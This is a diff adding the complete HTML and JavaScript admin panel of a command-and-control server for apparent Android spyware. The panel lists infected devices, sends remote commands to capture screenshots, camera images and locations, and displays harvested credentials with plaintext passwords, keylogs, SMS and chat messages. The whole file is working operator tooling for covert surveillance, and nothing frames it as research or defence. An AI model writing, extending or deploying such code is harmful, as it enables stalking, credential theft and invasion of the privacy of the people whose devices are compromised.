@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Server Admin Console</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
+        h1, h2 { color: #444; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .panel { background: #f5f5f5; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
+        .device-card { background: white; border: 1px solid #ddd; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
+        .device-controls { margin-top: 10px; }
+        button { background: #4CAF50; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #45a049; }
+        .data-types { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 20px; }
+        .data-type { background: #2196F3; color: white; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
+        .data-type.active { background: #0b7dda; }
+        #data-viewer { background: white; border: 1px solid #ddd; padding: 15px; border-radius: 5px; margin-top: 20px; max-height: 500px; overflow: auto; }
+        pre { margin: 0; white-space: pre-wrap; }
+        .result-card { margin-bottom: 15px; border: 1px solid #ddd; padding: 10px; border-radius: 4px; }
+        .loading { text-align: center; padding: 20px; }
+        .badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 12px; margin-left: 10px; }
+        .badge.online { background-color: #4CAF50; color: white; }
+        .badge.offline { background-color: #f44336; color: white; }
+        .badge.unknown { background-color: #9e9e9e; color: white; }
+        .map-link { color: #2196F3; text-decoration: none; }
+        .map-link:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>C2 Server Admin Console</h1>
+
+        <div class="panel">
+            <h2>Connected Devices</h2>
+            <div id="devices-list">Loading devices...</div>
+        </div>
+
+        <div class="panel">
+            <h2>Command Results</h2>
+            <select id="device-selector" onchange="loadCommandResults()">
+                <option value="">Select a device</option>
+            </select>
+            <div id="command-results">Select a device to view command results</div>
+        </div>
+
+        <div class="panel">
+            <h2>Harvested Data</h2>
+            <div class="data-types">
+                <div class="data-type" id="btn-credentials" onclick="loadData('credentials')">Credentials</div>
+                <div class="data-type" id="btn-keylog" onclick="loadData('keylog')">Keylog Data</div>
+                <div class="data-type" id="btn-location" onclick="loadData('location')">Location Data</div>
+                <div class="data-type" id="btn-messages" onclick="loadData('messages')">Messages</div>
+                <div class="data-type" id="btn-screenshots" onclick="loadData('screenshots')">Screenshots</div>
+                <div class="data-type active" id="btn-all" onclick="loadData('all')">All Data</div>
+            </div>
+            <div id="data-viewer">Select a data type to view</div>
+        </div>
+    </div>
+
+    <script>
+        // Current active data type button
+        let activeDataType = 'all';
+
+        // Load devices
+        function loadDevices() {
+            fetch('/devices')
+                .then(response => response.json())
+                .then(data => {
+                    const devicesDiv = document.getElementById('devices-list');
+                    if (data.length === 0) {
+                        devicesDiv.innerHTML = '<p>No devices registered yet.</p>';
+                        return;
+                    }
+
+                    let html = '';
+                    data.forEach(device => {
+                        // Set device status badge
+                        const statusBadge = getStatusBadge(device.status || 'unknown');
+
+                        html += `
+                            <div class="device-card">
+                                <h3>Device ID: ${device.device_id} ${statusBadge}</h3>
+                                <p>Registration Time: ${formatTimestamp(device.registration_time)}</p>
+                                <p>Last Seen: ${formatTimestamp(device.last_seen)}</p>
+                                <div class="device-info">
+                                    <p>Device Model: ${device.device_info?.model || 'Unknown'}</p>
+                                    <p>Android Version: ${device.device_info?.android_version || 'Unknown'}</p>
+                                    <p>Manufacturer: ${device.device_info?.manufacturer || 'Unknown'}</p>
+                                </div>
+                                <div class="device-controls">
+                                    <button onclick="sendCommand('${device.device_id}', 'collect_info')">Collect Device Info</button>
+                                    <button onclick="sendCommand('${device.device_id}', 'capture_screenshot')">Capture Screenshot</button>
+                                    <button onclick="sendCommand('${device.device_id}', 'capture_camera')">Capture Camera</button>
+                                    <button onclick="sendCommand('${device.device_id}', 'get_location')">Get Location</button>
+                                </div>
+                            </div>
+                        `;
+                    });
+
+                    devicesDiv.innerHTML = html;
+                })
+                .catch(error => {
+                    console.error('Error loading devices:', error);
+                    document.getElementById('devices-list').innerHTML = '<p>Error loading devices.</p>';
+                });
+        }
+
+        // Format timestamp for better display
+        function formatTimestamp(timestamp) {
+            if (!timestamp) return 'Unknown';
+
+            // Check if timestamp is ISO format
+            if (typeof timestamp === 'string' && timestamp.includes('T')) {
+                const date = new Date(timestamp);
+                if (isNaN(date.getTime())) return timestamp;
+
+                return date.toLocaleString();
+            }
+
+            return timestamp;
+        }
+
+        // Get status badge HTML
+        function getStatusBadge(status) {
+            const statusClass = status === 'active' ? 'online' :
+                               status === 'offline' ? 'offline' : 'unknown';
+
+            const statusText = status === 'active' ? 'Online' :
+                              status === 'offline' ? 'Offline' : 'Unknown';
+
+            return `<span class="badge ${statusClass}">${statusText}</span>`;
+        }
+
+        // Load devices into selector
+        function loadDeviceSelector() {
+            fetch('/devices')
+                .then(response => response.json())
+                .then(data => {
+                    const selector = document.getElementById('device-selector');
+                    // Clear existing options except the first one
+                    while (selector.options.length > 1) {
+                        selector.remove(1);
+                    }
+
+                    data.forEach(device => {
+                        const option = document.createElement('option');
+                        option.value = device.device_id;
+                        option.textContent = `${device.device_id} (${device.device_info?.model || 'Unknown'})`;
+                        selector.appendChild(option);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error loading devices:', error);
+                });
+        }
+
+        // Send command to device
+        function sendCommand(deviceId, commandType) {
+            const commandData = { command: commandType };
+
+            fetch('/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    device_id: deviceId,
+                    command: commandData
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        alert(`Command "${commandType}" sent to device ${deviceId}`);
+                    } else {
+                        alert(`Error sending command: ${data.message || 'Unknown error'}`);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending command:', error);
+                    alert('Error sending command. See console for details.');
+                });
+        }
+
+        // Load command results for selected device
+        function loadCommandResults() {
+            const deviceId = document.getElementById('device-selector').value;
+            if (!deviceId) return;
+
+            const resultsDiv = document.getElementById('command-results');
+            resultsDiv.innerHTML = '<div class="loading">Loading command results...</div>';
+
+            fetch(`/command_results/${deviceId}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data || data.length === 0) {
+                        resultsDiv.innerHTML = '<p>No command results for this device.</p>';
+                        return;
+                    }
+
+                    let html = '<h3>Command Results</h3>';
+                    data.forEach(result => {
+                        let resultContent = formatCommandResult(result);
+
+                        html += `
+                            <div class="result-card">
+                                <p><strong>Command:</strong> ${result.command_type}</p>
+                                <p><strong>Executed:</strong> ${formatTimestamp(result.executed_at)}</p>
+                                <p><strong>Result:</strong></p>
+                                ${resultContent}
+                            </div>
+                        `;
+                    });
+
+                    resultsDiv.innerHTML = html;
+                })
+                .catch(error => {
+                    console.error('Error loading command results:', error);
+                    document.getElementById('command-results').innerHTML =
+                        '<p>Error loading command results.</p>';
+                });
+        }
+
+        // Format command result based on command type
+        function formatCommandResult(result) {
+            const commandType = result.command_type;
+            const resultData = result.result || {};
+
+            if (commandType === 'capture_screenshot' && resultData.image_data) {
+                return `<img src="data:image/jpeg;base64,${resultData.image_data}" style="max-width: 100%; max-height: 300px;" />`;
+            } else if (commandType === 'get_location' && resultData.latitude && resultData.longitude) {
+                const mapUrl = resultData.map_url || `https://maps.google.com/?q=${resultData.latitude},${resultData.longitude}`;
+                return `
+                    <p>Latitude: ${resultData.latitude}</p>
+                    <p>Longitude: ${resultData.longitude}</p>
+                    <p><a href="${mapUrl}" target="_blank" class="map-link">View on Map</a></p>
+                `;
+            } else {
+                return `<pre>${JSON.stringify(resultData, null, 2)}</pre>`;
+            }
+        }
+
+        // Load data of specific type
+        function loadData(dataType) {
+            // Update active button
+            document.getElementById(`btn-${activeDataType}`).classList.remove('active');
+            document.getElementById(`btn-${dataType}`).classList.add('active');
+            activeDataType = dataType;
+
+            const dataViewer = document.getElementById('data-viewer');
+            dataViewer.innerHTML = '<div class="loading">Loading data...</div>';
+
+            fetch(`/data/${dataType}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.length === 0) {
+                        dataViewer.innerHTML = `<p>No data of type "${dataType}" available.</p>`;
+                        return;
+                    }
+
+                    let html = `<h3>${dataType} Data (${data.length} entries)</h3>`;
+
+                    data.forEach(item => {
+                        html += `
+                            <div style="border-bottom: 1px solid #ddd; padding-bottom: 10px; margin-bottom: 10px;">
+                                <p><strong>Device ID:</strong> ${item.device_id}</p>
+                                <p><strong>Timestamp:</strong> ${formatTimestamp(item.timestamp)}</p>`;
+
+                        if (item.error) {
+                            html += `<p style="color: red"><strong>Error:</strong> ${item.error}</p>`;
+                            if (item.raw_data) {
+                                html += `<p><strong>Raw Data:</strong></p><pre>${item.raw_data}</pre>`;
+                            }
+                        } else if (item.data) {
+                            // Format data based on type
+                            html += formatDataBasedOnType(item, dataType);
+                        }
+
+                        html += `</div>`;
+                    });
+
+                    dataViewer.innerHTML = html;
+                })
+                .catch(error => {
+                    console.error(`Error loading ${dataType} data:`, error);
+                    document.getElementById('data-viewer').innerHTML = `<p>Error loading ${dataType} data.</p>`;
+                });
+        }
+
+        function formatDataBasedOnType(item, dataType) {
+            let html = '';
+            const itemData = item.data || {};
+
+            // Determine actual data type from item
+            const actualType = itemData.type ||
+                                (dataType !== 'all' ? dataType :
+                                (item.data_type || 'unknown'));
+
+            // Handle different data types appropriately
+            if (actualType.toLowerCase().includes('location')) {
+                // Format location data
+                if (itemData.latitude && itemData.longitude) {
+                    html += `<p><strong>Location:</strong> ${itemData.latitude}, ${itemData.longitude}</p>`;
+                    const mapUrl = itemData.map_url || `https://maps.google.com/?q=${itemData.latitude},${itemData.longitude}`;
+                    html += `<p><a href="${mapUrl}" target="_blank" class="map-link">View on Map</a></p>`;
+                } else if (itemData.data && typeof itemData.data === 'string') {
+                    // Try to parse nested data
+                    try {
+                        const locationData = JSON.parse(itemData.data);
+                        if (locationData.latitude && locationData.longitude) {
+                            html += `<p><strong>Location:</strong> ${locationData.latitude}, ${locationData.longitude}</p>`;
+                            const mapUrl = `https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}`;
+                            html += `<p><a href="${mapUrl}" target="_blank" class="map-link">View on Map</a></p>`;
+                        }
+                    } catch (e) {
+                        // Not JSON, ignore
+                    }
+                }
+            } else if (actualType.toLowerCase().includes('screenshot') ||
+                      actualType.toLowerCase().includes('camera') ||
+                      actualType.toLowerCase().includes('image')) {
+                // Display images if present
+                if (itemData.image_data) {
+                    html += `<img src="data:image/jpeg;base64,${itemData.image_data}" style="max-width: 100%; max-height: 300px;" />`;
+                }
+
+                // Display decoded files if they exist
+                if (itemData.decoded_files) {
+                    html += `<p><strong>Screenshot Files:</strong></p>`;
+                    for (const [fileName, content] of Object.entries(itemData.decoded_files)) {
+                        if (fileName.endsWith('.jpg') || fileName.endsWith('.png')) {
+                            html += `<p>${fileName}</p>`;
+                            html += `<img src="data:image/jpeg;base64,${content}" style="max-width: 100%; max-height: 300px;" />`;
+                        }
+                    }
+                }
+            } else if (actualType.toLowerCase().includes('credential') ||
+                       actualType.toLowerCase().includes('auth') ||
+                       actualType.toLowerCase().includes('login')) {
+                // Format credential data
+                if (itemData.username) {
+                    html += `<p><strong>Source:</strong> ${itemData.source || 'Unknown'}</p>`;
+                    html += `<p><strong>Username:</strong> ${itemData.username}</p>`;
+                    html += `<p><strong>Password:</strong> ${itemData.password || '******'}</p>`;
+                } else if (itemData.data && typeof itemData.data === 'string') {
+                    // Try to parse nested data
+                    try {
+                        const credData = JSON.parse(itemData.data);
+                        if (credData.username) {
+                            html += `<p><strong>Source:</strong> ${credData.source || 'Unknown'}</p>`;
+                            html += `<p><strong>Username:</strong> ${credData.username}</p>`;
+                            html += `<p><strong>Password:</strong> ${credData.password || '******'}</p>`;
+                        }
+                    } catch (e) {
+                        // Not JSON, treat as text
+                        if (itemData.data.includes(':')) {
+                            const parts = itemData.data.split(':', 2);
+                            html += `<p><strong>Username:</strong> ${parts[0]}</p>`;
+                            html += `<p><strong>Password:</strong> ${parts[1] || '******'}</p>`;
+                        } else {
+                            html += `<p><strong>Raw Data:</strong> ${itemData.data}</p>`;
+                        }
+                    }
+                }
+            } else if (actualType.toLowerCase().includes('keylog') ||
+                      actualType.toLowerCase().includes('input')) {
+                // Format keylog data
+                if (itemData.text) {
+                    html += `<p><strong>Input Text:</strong></p>`;
+                    html += `<pre style="white-space: pre-wrap;">${itemData.text}</pre>`;
+                } else if (itemData.data && typeof itemData.data === 'string') {
+                    html += `<p><strong>Input Text:</strong></p>`;
+                    html += `<pre style="white-space: pre-wrap;">${itemData.data}</pre>`;
+                }
+            } else if (actualType.toLowerCase().includes('message') ||
+                       actualType.toLowerCase().includes('sms') ||
+                       actualType.toLowerCase().includes('chat')) {
+                // Format message data
+                if (itemData.message) {
+                    html += `<p><strong>From:</strong> ${itemData.sender || 'Unknown'}</p>`;
+                    html += `<p><strong>To:</strong> ${itemData.recipient || 'Unknown'}</p>`;
+                    html += `<p><strong>Message:</strong></p>`;
+                    html += `<pre style="white-space: pre-wrap;">${itemData.message}</pre>`;
+                }
+            }
+
+            // Always include decoded files if they exist
+            if (itemData.decoded_files && !actualType.toLowerCase().includes('screenshot')) {
+                html += `<p><strong>Decoded Files:</strong></p>`;
+                for (const [fileName, content] of Object.entries(itemData.decoded_files)) {
+                    html += `
+                        <div style="margin-left: 20px; margin-bottom: 10px;">
+                            <p><strong>${fileName}</strong></p>
+                            <pre style="background: #f5f5f5; padding: 10px; border-radius: 4px;">${content}</pre>
+                        </div>`;
+                }
+            }
+
+            // Always include raw data
+            html += `<details>
+                        <summary>View Raw Data</summary>
+                        <pre>${JSON.stringify(item.data, null, 2)}</pre>
+                     </details>`;
+
+            return html;
+        }
+
+        // Initial load
+        document.addEventListener('DOMContentLoaded', function() {
+            loadDevices();
+            loadDeviceSelector();
+            loadData('all'); // Load all data by default
+
+            // Refresh devices every 30 seconds
+            setInterval(() => {
+                loadDevices();
+                loadDeviceSelector();
+
+                // Refresh command results if a device is selected
+                if (document.getElementById('device-selector').value) {
+                    loadCommandResults();
+                }
+
+                // Refresh data viewer with current data type
+                loadData(activeDataType);
+            }, 30000);
+        });
+    </script>
+</body>
+</html>
